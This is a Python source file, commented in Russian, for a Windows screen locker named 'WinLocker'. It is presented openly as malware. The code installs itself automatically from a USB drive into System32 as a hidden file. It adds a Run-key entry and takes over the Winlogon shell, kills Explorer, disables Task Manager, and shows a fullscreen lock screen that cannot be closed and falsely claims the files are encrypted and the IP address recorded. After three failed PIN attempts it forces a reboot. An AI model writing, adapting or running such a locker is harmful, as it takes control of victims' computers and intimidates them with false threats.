import tkinter as tk
import os
import sys
import ctypes
import subprocess
import time
import threading
import winreg as reg
import shutil

# ===== АВТОУСТАНОВКА ПРИ ЗАПУСКЕ С ФЛЕШКИ =====
def is_running_from_usb():
    """Проверка, запущен ли скрипт с флешки"""
    script_path = os.path.abspath(sys.argv[0])
    # Флешки обычно на D:, E:, F:, G: и т.д.
    if len(script_path) > 1 and script_path[1] == ':':
        drive = script_path[0]
        # Проверяем, является ли диск съемным
        try:
            import win32file
            if win32file.GetDriveType(f"{drive}:\\") == win32file.DRIVE_REMOVABLE:
                return True
        except:
            # Если win32file нет, проверяем по букве
            if drive in 'DEFGHIJKLMN':
                return True
    return False

def install_from_usb():
    """Установка в систему при запуске с флешки"""
    script_path = os.path.abspath(sys.argv[0])
    target_path = r"C:\Windows\System32\winlocker.exe"
    
    # Конвертируем в exe если нужно или просто копируем
    try:
        shutil.copy2(script_path, target_path)
        ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)  # скрытый
    except:
        target_path = os.path.join(os.environ['TEMP'], 'winlocker.py')
        shutil.copy2(script_path, target_path)
    
    # Добавление в автозагрузку
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WinLocker1337", 0, reg.REG_SZ, f'python "{target_path}"')
        reg.CloseKey(key)
    except:
        pass
    
    # Замена оболочки
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,
                         r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Shell", 0, reg.REG_SZ, f'python "{target_path}"')
        reg.CloseKey(key)
    except:
        pass
    
    # Перезапуск уже из системы
    subprocess.Popen(f'python "{target_path}"', shell=True)
    sys.exit(0)

# Если запущено с флешки - устанавливаем в систему
if is_running_from_usb():
    install_from_usb()
# ==============================================

UNLOCKED = False
SCRIPT_PATH = os.path.abspath(sys.argv[0])

def full_uninstall():
    """Полное удаление из системы"""
    try:
        # Удаление из реестра
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key, "WinLocker1337")
            reg.CloseKey(key)
        except:
            pass
        
        # Восстановление оболочки
        try:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "Shell", 0, reg.REG_SZ, "explorer.exe")
            reg.CloseKey(key)
        except:
            pass
        
        # Удаление службы
        subprocess.run('sc delete WinLocker1337', shell=True, capture_output=True)
        
        # Удаление файлов
        paths_to_delete = [
            r"C:\Windows\System32\winlocker.exe",
            os.path.join(os.environ['TEMP'], 'winlocker.py')
        ]
        for path in paths_to_delete:
            if os.path.exists(path):
                try:
                    os.remove(path)
                except:
                    pass
        
        # Восстановление explorer
        subprocess.Popen(["explorer.exe"])
    except:
        pass

class WinLocker:
    def __init__(self):
        self.attempts = 0
        self.max_attempts = 3
        self.password = "1337"
        self.running = True
        
        # Применяем блокировки
        self.apply_locks()
        
        # Создаем окно
        self.create_window()
        
        # Защитные потоки
        self.start_protection()
        
        self.root.mainloop()
    
    def apply_locks(self):
        """Блокировка системы"""
        try:
            # Убить проводник
            subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
            
            # Отключение диспетчера задач
            try:
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
                reg.CloseKey(key)
            except:
                pass
        except:
            pass
    
    def start_protection(self):
        def keep_top():
            while self.running:
                try:
                    self.root.attributes("-fullscreen", True)
                    self.root.attributes("-topmost", True)
                    self.root.focus_force()
                    self.root.grab_set()
                except:
                    pass
                time.sleep(0.1)
        
        def prevent_close():
            while self.running:
                try:
                    self.root.protocol("WM_DELETE_WINDOW", lambda: None)
                    self.root.bind("<Alt-F4>", lambda e: "break")
                    self.root.bind("<Escape>", lambda e: "break")
                except:
                    pass
                time.sleep(0.5)
        
        threading.Thread(target=keep_top, daemon=True).start()
        threading.Thread(target=prevent_close, daemon=True).start()
    
    def create_window(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.overrideredirect(True)
        self.root.grab_set()
        self.root.focus_force()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        
        title = tk.Label(frame, text="⚠️ СИСТЕМА ЗАБЛОКИРОВАНА ⚠️",
                        font=("Courier New", 40, "bold"), fg="#ff0000", bg="black")
        title.pack(pady=50)
        
        scary_text = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║              ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗     ║
    ║              ██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ║
    ║              ██║     ██║   ██║██║     █████╔╝ █████╗  ██████╔╝    ║
    ║              ██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ║
    ║              ███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║    ║
    ║              ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ║
    ║                                                                   ║
    ║                    ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ                         ║
    ║                    IP ЗАФИКСИРОВАН                                ║
    ║                                                                   ║
    ║                    ВВЕДИТЕ ПАРОЛЬ ДЛЯ РАЗБЛОКИРОВКИ:              ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
        """
        
        msg = tk.Label(frame, text=scary_text,
                      font=("Courier New", 12), fg="#ff3333", bg="black", justify="left")
        msg.pack(pady=20)
        
        self.entry = tk.Entry(frame, font=("Courier New", 26, "bold"),
                             show="•", justify="center", bg="black",
                             fg="#ff0000", insertbackground="red", width=15)
        self.entry.pack(pady=20)
        self.entry.focus_force()
        self.entry.bind("<Key>", self.only_digits)
        self.entry.bind("<Return>", lambda e: self.check_password())
        
        btn = tk.Button(frame, text="РАЗБЛОКИРОВАТЬ",
                       font=("Courier New", 18, "bold"), fg="white", bg="#cc0000",
                       command=self.check_password, cursor="hand2")
        btn.pack(pady=15)
        
        self.attempts_label = tk.Label(frame, text=f"ПОПЫТКИ: 0/{self.max_attempts}",
                                       font=("Courier New", 12), fg="#666666", bg="black")
        self.attempts_label.pack(pady=10)
        
        warning = tk.Label(frame, text="⚠️ НЕ ЗАКРЫВАЙТЕ ЭТО ОКНО ⚠️",
                          font=("Courier New", 10), fg="#ff6666", bg="black")
        warning.pack(side="bottom", pady=20)
        
        self.root.bind_all("<Key>", self.block_key)
    
    def only_digits(self, event):
        if event.keysym == "BackSpace":
            return
        if not event.char.isdigit():
            return "break"
    
    def block_key(self, event):
        if event.keysym == "Home" and (event.state & 0x20000):  # Tab+Home
            self.emergency_unlock()
            return "break"
        allowed = ["BackSpace", "Tab", "Return", "Home"]
        if event.keysym in allowed:
            return None
        if event.char.isdigit():
            return None
        return "break"
    
    def play_sound(self):
        def sound():
            try:
                import winsound
                for freq in [300, 600, 1200, 800, 400]:
                    winsound.Beep(freq, 150)
                    time.sleep(0.05)
            except:
                pass
        threading.Thread(target=sound, daemon=True).start()
    
    def check_password(self):
        password = self.entry.get()
        if password == self.password:
            self.unlock_system()
        else:
            self.attempts += 1
            self.entry.delete(0, tk.END)
            self.attempts_label.config(text=f"ПОПЫТКИ: {self.attempts}/{self.max_attempts}", fg="#ff0000")
            self.play_sound()
            if self.attempts >= self.max_attempts:
                self.system_destroy()
            else:
                self.root.configure(bg="#330000")
                self.root.after(300, lambda: self.root.configure(bg="black"))
    
    def unlock_system(self):
        self.running = False
        full_uninstall()
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        msg = tk.Label(frame, text="✅ ДОСТУП РАЗРЕШЕН ✅\n\nСИСТЕМА РАЗБЛОКИРОВАНА",
                      font=("Courier New", 24, "bold"), fg="#00ff00", bg="black")
        msg.pack(expand=True)
        self.root.update()
        time.sleep(2)
        self.root.destroy()
        sys.exit(0)
    
    def system_destroy(self):
        self.running = False
        for widget in self.root.winfo_children():
            widget.destroy()
        frame = tk.Frame(self.root, bg="red")
        frame.pack(expand=True, fill="both")
        msg = tk.Label(frame, text="💀 СИСТЕМА УНИЧТОЖЕНА 💀\n\nПЕРЕЗАГРУЗКА...",
                      font=("Courier New", 28, "bold"), fg="white", bg="red")
        msg.pack(expand=True)
        self.root.update()
        time.sleep(2)
        subprocess.run(["shutdown", "/r", "/t", "0", "/f"], shell=True)
        sys.exit(0)
    
    def emergency_unlock(self):
        self.running = False
        full_uninstall()
        self.root.destroy()
        sys.exit(0)

if __name__ == "__main__":
    try:
        WinLocker()
    except Exception as e:
        time.sleep(1)
        os.execl(sys.executable, sys.executable, *sys.argv)